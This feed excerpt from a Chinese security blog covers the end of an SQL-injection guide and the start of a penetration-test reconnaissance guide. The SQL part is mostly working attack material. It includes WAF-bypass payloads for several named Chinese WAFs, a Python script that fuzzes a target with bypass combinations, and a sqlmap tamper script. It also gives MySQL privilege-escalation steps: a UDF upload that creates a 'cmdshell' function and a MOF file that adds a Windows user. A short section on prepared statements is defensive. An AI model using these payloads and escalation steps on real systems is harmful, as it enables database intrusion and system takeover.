title="URI参数溢出"></a>URI参数溢出</h3><p>同ngx_lua_waf</p><h3 id="GET-POST"><a href="#GET-POST" class="headerlink" title="GET+POST"></a>GET+POST</h3><p>提交POST请求时，忽略GET请求中的参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.204.132/sql.aspx?id=1 and 1=2 union select 1,column_name,3 from information_schema.columns</span><br><span class="line"></span><br><span class="line">POST：aaa</span><br></pre></td></tr></table></figure><h3 id="multipart-form-data"><a href="#multipart-form-data" class="headerlink" title="multipart/form-data"></a>multipart/form-data</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundaryACZoaLJJzUwc4hYM</span><br><span class="line">Content-Disposition: form-data; name=&quot;id&quot;</span><br><span class="line">1 union /*!select*/ 1,2,schema_name</span><br><span class="line">from information_schema.SCHEMATA</span><br><span class="line">------WebKitFormBoundaryACZoaLJJzUwc4hYM--</span><br></pre></td></tr></table></figure><h3 id="内联注释"><a href="#内联注释" class="headerlink" title="内联注释"></a>内联注释</h3><p>直接用fuzz脚本，结合注释、空格绕过和<code>/*!*/</code>进行绕过：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://test.com/index.php?id=1"</span></span><br><span class="line">Fuzz_a = [ <span class="string">'/*!'</span>, <span class="string">'*/'</span>, <span class="string">'/**/'</span>, <span class="string">'/'</span>, <span class="string">'?'</span>, <span class="string">'~'</span>, <span class="string">'!'</span>, <span class="string">'.'</span>, <span class="string">'%'</span>, <span class="string">'-'</span>, <span class="string">'*'</span>, <span class="string">'+'</span>, <span class="string">'='</span>]</span><br><span class="line">Fuzz_b = [<span class="string">''</span>]</span><br><span class="line">Fuzz_c = [<span class="string">'%0a'</span>, <span class="string">'%0b'</span>, <span class="string">'%0c'</span>, <span class="string">'%0d'</span>, <span class="string">'%0e'</span>, <span class="string">'%0f'</span>, <span class="string">'%0h'</span>, <span class="string">'%0i'</span>, <span class="string">'%0j'</span>]</span><br><span class="line">FUZZ = Fuzz_a + Fuzz_b + Fuzz_c</span><br><span class="line"><span class="comment"># 配置fuzz字典</span></span><br><span class="line">header = &#123; <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'</span>&#125;</span><br><span class="line">sql=<span class="string">'union select SCHEMA_NAME,2 from information_schema.SCHEMATA'</span></span><br><span class="line">sql_arr=<span class="string">"/*!&#123;&#125;*/#"</span>.format(sql).split()</span><br><span class="line"><span class="comment"># 设置请求的headers</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> FUZZ:</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> FUZZ:</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> FUZZ:</span><br><span class="line">            <span class="keyword">for</span> d <span class="keyword">in</span> FUZZ:</span><br><span class="line">                <span class="keyword">for</span> e <span class="keyword">in</span> FUZZ:</span><br><span class="line">                    fuzz_here=a + b + c + d + e</span><br><span class="line">                    <span class="comment"># RAW: PYLOAD = "/*!union" + fuzz_here + "select 1,2*/#"</span></span><br><span class="line">                    PYLOAD = fuzz_here.join(sql_arr)</span><br><span class="line">                    <span class="comment">#  exit(0)</span></span><br><span class="line">                    urlp = url + PYLOAD</span><br><span class="line">                    res = requests.get(urlp, headers=header)</span><br><span class="line">                    <span class="comment"># 使用for排列组合fuzz字典并请求页面, 因为组合后不一定符合sql语句，所以需要用正常页面特征做判断</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="string">'wait'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                        <span class="keyword">print</span> (<span class="string">"[*]URL:"</span> + urlp + <span class="string">u"过狗！"</span>)</span><br><span class="line">                        <span class="comment"># 如果返回的页面中包含wait字符，则打印并写出过狗payload。</span></span><br></pre></td></tr></table></figure><h2 id="绕过护卫神"><a href="#绕过护卫神" class="headerlink" title="绕过护卫神"></a>绕过护卫神</h2><p>详细请参考<a href="https://www.t00ls.net/articles-46165.html" target="_blank" rel="noopener">Bypass 护卫神SQL注入防御（多姿势）</a></p><h3 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h3><p>ASPX:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/sql.aspx?id=1%00and 1=2 union select 1,2,column_name from information_schema.columns</span><br></pre></td></tr></table></figure><p>PHP:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/sql.php?id=1/*%00*/union select 1,schema_name,3 from information_schema.schemata</span><br></pre></td></tr></table></figure><h3 id="Unicode编码"><a href="#Unicode编码" class="headerlink" title="Unicode编码"></a>Unicode编码</h3><p>适用于IIS服务器<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.204.132/sql.aspx?id=1 and 1=2 union s%u0045lect 1,2,column_name from information_schema.columns</span><br></pre></td></tr></table></figure></p><h3 id="HPP"><a href="#HPP" class="headerlink" title="HPP"></a>HPP</h3><p>ASPX中接受参数顺序为为GET，POST，COOKIE：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.204.132/sql.aspx?id=1 and 1=2 union/*</span><br><span class="line"></span><br><span class="line">POST：id=*/select 1,column_name,3 from information_schema.columns</span><br></pre></td></tr></table></figure><h3 id="号"><a href="#号" class="headerlink" title="%号"></a>%号</h3><p>IIS+ASP中解析会去掉%：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/sql.asp?id=1 and 1=2 un%ion select 1,2,column_name from information_schema.columns</span><br></pre></td></tr></table></figure><h3 id="缓冲区溢出-1"><a href="#缓冲区溢出-1" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h3><p>同360的缓冲区溢出，(Select 0xA*49099)。</p><h2 id="绕过安全狗"><a href="#绕过安全狗" class="headerlink" title="绕过安全狗"></a>绕过安全狗</h2><p>同360主机卫士的内联注释绕过</p><h2 id="分块传输"><a href="#分块传输" class="headerlink" title="分块传输"></a>分块传输</h2><p>详见<a href="https://anemone.top/HTTP-HTTP协议复习/">HTTP协议复习</a>分块传输部分</p><h2 id="SQLMap-Tamper写法"><a href="#SQLMap-Tamper写法" class="headerlink" title="SQLMap Tamper写法"></a>SQLMap Tamper写法</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"><span class="keyword">from</span> lib.core.settings <span class="keyword">import</span> UNICODE_ENCODING</span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span><span class="params">()</span>:</span></span><br><span class="line">  <span class="keyword">pass</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span><span class="params">(payload, **kwargs)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        payload=payload.replace(<span class="string">"UNION ALL SELECT"</span>,<span class="string">"union%23!@%23$%%5e%26%2a()%60~%0a/*!12345select*/"</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">"UNION SELECT"</span>,<span class="string">"union%23!@%23$%%5e%26%2a()%60~%0a/*!12345select*/"</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">" FROM "</span>,<span class="string">"/*!%23!@%23$%%5e%26%2a()%60~%0afrOm*/"</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">"CONCAT"</span>,<span class="string">"/*!12345CONCAT*/"</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">"CAST("</span>,<span class="string">"/*!12345CAST(*/"</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">"CASE"</span>,<span class="string">"/*!12345CASE*/"</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">"DATABASE()"</span>,<span class="string">"database/**/()"</span>)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure><h1 id="不同用户的权限"><a href="#不同用户的权限" class="headerlink" title="不同用户的权限"></a>不同用户的权限</h1><h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><p>普通用户有information_schema表的读权限，但没有mysql表的读权限</p><h2 id="MSSQL"><a href="#MSSQL" class="headerlink" title="MSSQL"></a>MSSQL</h2><p>很复杂，详细看<a href="https://paper.tuisec.win/detail/9146d3bd2335703" target="_blank" rel="noopener">深秋之夜360面试有感</a></p><h1 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h1><p>需要解除<code>secure-file-priv=</code><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">'文件内容'</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'文件路径'</span></span><br><span class="line"><span class="keyword">select</span> <span class="string">'文件内容'</span> <span class="keyword">into</span> <span class="keyword">dumpfile</span> <span class="string">'文件路径'</span></span><br></pre></td></tr></table></figure></p><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="用户自定义函数提权（UDF）"><a href="#用户自定义函数提权（UDF）" class="headerlink" title="用户自定义函数提权（UDF）"></a>用户自定义函数提权（UDF）</h2><h3 id="获取UDF-dll的hex编码"><a href="#获取UDF-dll的hex编码" class="headerlink" title="获取UDF.dll的hex编码"></a>获取UDF.dll的hex编码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select hex(load_file(%USER%\\Desktop\\udf.dll)) into dumpfile &apos;%USER%\\Desktop\\udf.txt&apos;;</span><br></pre></td></tr></table></figure><h3 id="保存udf-dll到目标主机"><a href="#保存udf-dll到目标主机" class="headerlink" title="保存udf.dll到目标主机"></a>保存udf.dll到目标主机</h3><p>若数据库版本为5.0以下将其保存到<code>C:\Windows\</code>或<code>C:\Windows\System32\</code>，否则保存到<code>@@basedir\lib\plugin\</code></p><p>使用<code>select &#39;xxx&#39; into dumpfile &#39;C:/MySQL/lib/plugin/::$INDEX_ALLOCATION&#39;;</code>新建文件夹(这里我没成功，网上说确实不成功)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE Temp_udf(udf BLOB);</span><br><span class="line">INSERT into Temp_udf values (unhex(&apos;$shellcode&apos;));   #$shellcode为hex(udf.dll)</span><br><span class="line">SELECT udf FROM Temp_udf INTO DUMPFILE &apos;C:/MySQL/lib/plugin/udf.dll&apos;;</span><br></pre></td></tr></table></figure><h3 id="使用用户函数提权"><a href="#使用用户函数提权" class="headerlink" title="使用用户函数提权"></a>使用用户函数提权</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">create function cmdshell returns string soname &apos;udf.dll&apos;;  #此处不能填绝对路径 只能是dll名</span><br><span class="line">select * from mysql.func;                  #看看cmdshell function是否创立，创立就继续</span><br><span class="line">select hex(cmdshell(&apos;whoami&apos;));            #运行各种命令提权</span><br></pre></td></tr></table></figure><h2 id="mof提权"><a href="#mof提权" class="headerlink" title="mof提权"></a>mof提权</h2><p>由于<strong>c:/windows/system32/wbem/mof/</strong>目录下的 <strong>nullevt.mof</strong> 文件，每分钟都会在一个特定的时间去执行一次，因此可以使用dumpfile将shell写入，然后由系统执行（有点像linux的crontab）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;)</span><br><span class="line"> </span><br><span class="line">instance of __EventFilter as $EventFilter</span><br><span class="line">&#123;</span><br><span class="line">    EventNamespace = &quot;Root\\Cimv2&quot;;</span><br><span class="line">    Name  = &quot;filtP2&quot;;</span><br><span class="line">    Query = &quot;Select * From __InstanceModificationEvent &quot;</span><br><span class="line">            &quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;</span><br><span class="line">            &quot;And TargetInstance.Second = 5&quot;;</span><br><span class="line">    QueryLanguage = &quot;WQL&quot;;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer</span><br><span class="line">&#123;</span><br><span class="line">    Name = &quot;consPCSV2&quot;;</span><br><span class="line">    ScriptingEngine = &quot;JScript&quot;;</span><br><span class="line">    ScriptText =</span><br><span class="line">&quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user anemone /add\&quot;)&quot;;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line">instance of __FilterToConsumerBinding</span><br><span class="line">&#123;</span><br><span class="line">    Consumer   = $Consumer;</span><br><span class="line">    Filter = $EventFilter;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>上传之后用mysql写文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&apos;c:/www/nullevt.mof&apos;) into dumpfile &apos;c:/windows/system32/wbem/mof/nullevt.mof&apos;</span><br></pre></td></tr></table></figure><h1 id="防御——使用预编译语句"><a href="#防御——使用预编译语句" class="headerlink" title="防御——使用预编译语句"></a>防御——使用预编译语句</h1><p>预先编译sql，后面的注入语句只能做普通字符串查询，预编译语句不能用于orderby</p><p>SQL写法：</p><ol><li><p>预编译</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">prepare ins from &apos;insert into t select ?,?&apos;;</span><br></pre></td></tr></table></figure></li><li><p>执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set @a=999,@b=&apos;hello&apos;;</span><br><span class="line">execute ins using @a,@b;</span><br><span class="line">select * from t;</span><br></pre></td></tr></table></figure></li><li><p>释放</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">deallocate prepare ins;</span><br></pre></td></tr></table></figure></li></ol><p>三次交互：</p><p><img src="/sqli-SQL注入总结/1551840783777.png" alt="1551840783777"></p><p>Python写法，python并不支持MySQL的预编译语句（第三方库oursql支持），只是将字符串转义后放到数据库查询：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cursor.execute(<span class="string">'insert into user (name,password) value (%s,%s)'</span>,(name,password))</span><br></pre></td></tr></table></figure><p>Java写法，需要开启预编译功能（useServerPrepStmts=true），程序与数据库3次交互prepare-&gt;execute-&gt;close stmt</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    Class.forName(name);<span class="comment">//指定连接类型</span></span><br><span class="line">    conn = DriverManager.getConnection(url, user, password);<span class="comment">//获取连接</span></span><br><span class="line">    pst = conn.prepareStatement(<span class="string">"SELECT * FROM users WHERE `name`=?"</span>);<span class="comment">//准备执行语句</span></span><br><span class="line">    pst.setString(<span class="number">1</span>,<span class="string">"9ian1i"</span>);</span><br><span class="line">    rs = pst.executeQuery();</span><br><span class="line">    <span class="keyword">while</span> (rs.next())&#123;</span><br><span class="line">        String name = rs.getString(<span class="string">"name"</span>);</span><br><span class="line">        System.out.println(name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>php写法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$name=$_GET[<span class="string">'name'</span>];</span><br><span class="line">$mysqli = <span class="keyword">new</span> mysqli(<span class="string">'127.0.0.1'</span>,<span class="string">'root'</span>,<span class="string">'root'</span>,<span class="string">'test'</span>);</span><br><span class="line">$mysqli_stmt=$mysqli-&gt;prepare(<span class="string">"select username, password from test where username=?"</span>);</span><br><span class="line">$mysqli_stmt-&gt;bind_param(<span class="string">'s'</span>, $name);</span><br><span class="line">$mysqli_stmt-&gt;execute();</span><br><span class="line">$mysqli_stmt-&gt;bind_result($username, $password);</span><br><span class="line"><span class="keyword">while</span>($mysqli_stmt-&gt;fetch())&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"$username--$password"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li><p>十种MySQL报错注入，<a href="https://www.cnblogs.com/xishaonian/p/6102750.html" target="_blank" rel="noopener">https://www.cnblogs.com/xishaonian/p/6102750.html</a></p></li><li><p>深入探究宽字节注入漏洞与修补原理，<a href="https://blog.csdn.net/qq_29419013/article/details/81205291" target="_blank" rel="noopener">https://blog.csdn.net/qq_29419013/article/details/81205291</a> </p></li><li><p>Bypass ngx_lua_waf SQL注入防御（多姿势），<a href="https://www.t00ls.net/articles-45736.html" target="_blank" rel="noopener">https://www.t00ls.net/articles-45736.html</a></p></li><li><p>Bypass 360主机卫士SQL注入防御（多姿势），<a href="https://www.t00ls.net/articles-45943.html" target="_blank" rel="noopener">https://www.t00ls.net/articles-45943.html</a></p></li><li><p>Bypass 护卫神SQL注入防御（多姿势），<a href="https://www.t00ls.net/articles-46165.html" target="_blank" rel="noopener">https://www.t00ls.net/articles-46165.html</a> </p></li><li><p>深秋之夜360面试有感，<a href="https://paper.tuisec.win/detail/9146d3bd2335703" target="_blank" rel="noopener">https://paper.tuisec.win/detail/9146d3bd2335703</a></p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;注入类型&quot;&gt;&lt;a href=&quot;#注入类型&quot; class=&quot;headerlink&quot; title=&quot;注入类型&quot;&gt;&lt;/a&gt;注入类型&lt;/h1&gt;&lt;h2 id=&quot;Union-Based&quot;&gt;&lt;a href=&quot;#Union-Based&quot; class=&quot;headerlink&quot; title=&quot;Union Based&quot;&gt;&lt;/a&gt;Union Based&lt;/h2&gt;&lt;p&gt;最基本的注入类型，以MySQL为例，假设有注入点：&lt;/p&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;SELECT * FROM `test` &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;WHERE `username`=&amp;apos;admin&amp;apos; and `password`=&amp;apos;*&amp;apos;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&quot;0x01-判断注入点&quot;&gt;&lt;a href=&quot;#0x01-判断注入点&quot; class=&quot;headerlink&quot; title=&quot;0x01 判断注入点&quot;&gt;&lt;/a&gt;0x01 判断注入点&lt;/h3&gt;
    
    </summary>
    
      <category term="Web安全-SQL注入" scheme="http://anemone.top/categories/Web%E5%AE%89%E5%85%A8-SQL%E6%B3%A8%E5%85%A5/"/>
    
    
      <category term="SQL" scheme="http://anemone.top/tags/SQL/"/>
    
      <category term="注入" scheme="http://anemone.top/tags/%E6%B3%A8%E5%85%A5/"/>
    
      <category term="waf绕过" scheme="http://anemone.top/tags/waf%E7%BB%95%E8%BF%87/"/>
    
  </entry>
  
  <entry>
    <title>信息收集思路整理</title>
    <link href="http://anemone.top/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%9D%E8%B7%AF%E6%95%B4%E7%90%86/"/>
    <id>http://anemone.top/信息收集-信息收集思路整理/</id>
    <published>2019-02-10T07:08:35.000Z</published>
    <updated>2019-09-22T10:14:18.722Z</updated>
    
    <content type="html"><![CDATA[<p>信息收集是渗透测试的第一步，本文总结目前信息收集的具体操作步骤。</p><h1 id="网站信息"><a href="#网站信息" class="headerlink" title="网站信息"></a>网站信息</h1><h2 id="whois信息"><a href="#whois信息" class="headerlink" title="whois信息"></a>whois信息</h2><p>可以收集到的信息有：</p><ul><li>联系人</li><li>邮箱（可以到社工库进一步查询）</li><li>电话</li></ul><p>收集途径有：</p><ul><li><a href="http://whois.chinaz.com/" target="_blank" rel="noopener">http://whois.chinaz.com/</a> （站长之家）</li><li><a href="https://who.is/" target="_blank" rel="noopener">https://who.is/</a> （国外）</li><li><a href="https://x.threatbook.cn/（通过邮箱查询其他的站点）" target="_blank" rel="noopener">https://x.threatbook.cn/（通过邮箱查询其他的站点）</a></li><li><a href="https://dns.aizhan.com/" target="_blank" rel="noopener">https://dns.aizhan.com/</a> （IP反查域名）</li><li>命令<code>whois anemone.top</code> </li></ul><a id="more"></a><h2 id="备案信息"><a href="#备案信息" class="headerlink" title="备案信息"></a>备案信息</h2><p>仍然是收集联系人、公司等信息</p><p>途径有：</p><ul><li><a href="https://www.tianyancha.com/brand/b59c12209" target="_blank" rel="noopener">https://www.tianyancha.com/brand/b59c12209</a> （天眼查）</li><li><a href="http://www.gsxt.gov.cn（国家信用公示）" target="_blank" rel="noopener">http://www.gsxt.gov.cn（国家信用公示）</a></li><li><a href="http://icp.chinaz.com（站长之家，可以查询其他备案站点）" target="_blank" rel="noopener">http://icp.chinaz.com（站长之家，可以查询其他备案站点）</a></li></ul><h2 id="DNS信息"><a href="#DNS信息" class="headerlink" title="DNS信息"></a>DNS信息</h2><p>DNS用来获取网站IP，但若网站使用了CDN服务则无效。</p><ul><li><code>dig anemone.top</code> # Linux</li><li><code>dig @1.1.1.1 anemone.top</code> # 使用1.1.1.1dns解析</li><li><code>nslookup anemone.top</code> # Windows</li></ul><h2 id="指纹信息"><a href="#指纹信息" class="headerlink" title="指纹信息"></a>指纹信息</h2><p>获取中间件类型和版本，通过http头部获取，也可以用whatweb工具：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ whatweb anemone.top</span><br></pre></td></tr></table></figure><p>根据目录、头文件、特有文件等识别CMS：</p><ul><li><a href="http://www.yunsee.cn/finger.html" target="_blank" rel="noopener">http://www.yunsee.cn/finger.html</a></li><li><a href="http://whatweb.bugscaner.com/look/" target="_blank" rel="noopener">http://whatweb.bugscaner.com/look/</a></li><li><a href="https://www.test404.com/post-1618.html" target="_blank" rel="noopener">Test404轻量CMS指纹识别</a> </li><li><code>nmap -p80,443 --script=http-waf-fingerprint ip</code></li><li><code>nmap -p80,443 --script=http-waf-fingerprint ip</code></li></ul><h1 id="服务器的相关信息"><a href="#服务器的相关信息" class="headerlink" title="服务器的相关信息"></a>服务器的相关信息</h1><h2 id="寻找真实IP"><a href="#寻找真实IP" class="headerlink" title="寻找真实IP"></a>寻找真实IP</h2><p>先用多地ping判断网站是否存在CDN：</p><ul><li><a href="http://tool.chinaz.com/dns/" target="_blank" rel="noopener">http://tool.chinaz.com/dns/</a></li></ul><p>若存在CDN则尝试如下办法寻找真实IP：</p><ul><li>分站域名</li><li><p>DNS历史记录</p><ul><li><a href="https://securitytrails.com/" target="_blank" rel="noopener">https://securitytrails.com/</a></li><li><a href="https://x.threatbook.cn/" target="_blank" rel="noopener">https://x.threatbook.cn/</a></li></ul><ul><li><a href="https://www.virustotal.com/#/home/search" target="_blank" rel="noopener">VirusTotal</a></li></ul></li><li><p>上传附件</p></li><li><p>国外DNS：利用国内网站不在国外做CDN的特点，使用国外的DNS解析，感谢”<a href="https://www.freebuf.com/articles/web/179043.html" target="_blank" rel="noopener">经验分享｜谈谈渗透测试中的信息搜集</a>“提供了以下冷门的DNS：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">209.244.0.3</span><br><span class="line">64.6.64.6</span><br><span class="line">8.8.8.8</span><br><span class="line">9.9.9.9</span><br><span class="line">8.26.56.26</span><br><span class="line">199.85.126.10</span><br><span class="line">208.67.222.222</span><br><span class="line">195.46.39.39</span><br><span class="line">69.195.152.204</span><br><span class="line">208.76.50.50</span><br><span class="line">216.146.35.35</span><br><span class="line">37.235.1.174</span><br><span class="line">198.101.242.72</span><br><span class="line">77.88.8.8</span><br><span class="line">91.239.100.100</span><br><span class="line">74.82.42.42</span><br><span class="line">109.69.8.51</span><br><span class="line">156.154.70.1</span><br><span class="line">1.1.1.1</span><br><span class="line">45.77.165.194</span><br></pre></td></tr></table></figure></li><li><p>邮箱：邮件服务器无法CDN，因此可以使用网站的邮件发送功能（如密码找回等）获取原IP，当然要确保网站的邮件服务器用的是自己的。</p></li><li><p>全网扫描：最笨的办法是使用工具扫描全网的IP段：</p><ul><li>zmap，<a href="https://github.com/zmap/zgrab" target="_blank" rel="noopener">zgrab</a>(<a href="https://www.t00ls.net/articles-40631.html" target="_blank" rel="noopener">https://www.t00ls.net/articles-40631.html</a>)</li><li>fuckcdn.exe</li><li>w8Fuckcdn</li></ul></li><li><p>网站漏洞，如：</p><ul><li>SSRF</li><li>phpinfo</li></ul></li></ul><h2 id="服务器系统"><a href="#服务器系统" class="headerlink" title="服务器系统"></a>服务器系统</h2><ul><li>网址大小写是否敏感判断Windows/Linux</li><li>nmap识别系统</li></ul><h2 id="开放端口"><a href="#开放端口" class="headerlink" title="开放端口"></a>开放端口</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sT -p- -sV 127.0.0.1</span><br></pre></td></tr></table></figure><p>常用端口有：</p><p>3306 mysql<br>1433 mssql<br>1521 oracle<br>5432 postgresql<br>6379 redis<br>27017 mongodb<br>8080 tomcat/resin/jetty<br>137 samba<br>873 rsync<br>5900 vnc</p><h2 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h2><p>从HTTP头部获取WAF信息</p><ul><li><a href="https://github.com/Ekultek/WhatWaf" target="_blank" rel="noopener">https://github.com/Ekultek/WhatWaf</a></li><li><code>wafw00f -a 域名</code></li></ul><h1 id="子域名、C段、旁站"><a href="#子域名、C段、旁站" class="headerlink" title="子域名、C段、旁站"></a>子域名、C段、旁站</h1><h2 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h2><ul><li>暴力枚举<ul><li>(dnsrecon)[<a href="https://github.com/darkoperator/dnsrecon" target="_blank" 